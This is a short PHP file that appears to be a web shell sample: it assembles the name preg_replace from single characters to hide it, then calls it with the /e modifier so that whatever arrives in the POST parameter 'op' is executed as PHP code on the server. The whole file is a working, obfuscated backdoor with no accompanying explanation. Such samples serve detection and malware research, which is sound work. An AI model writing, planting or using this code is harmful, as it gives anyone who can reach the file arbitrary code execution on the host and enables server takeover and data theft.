<?php
    $hh = "p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e"; //preg_replace
    $hh("/littlehann/e",$_POST['op'],"111littlehann222"); 
?>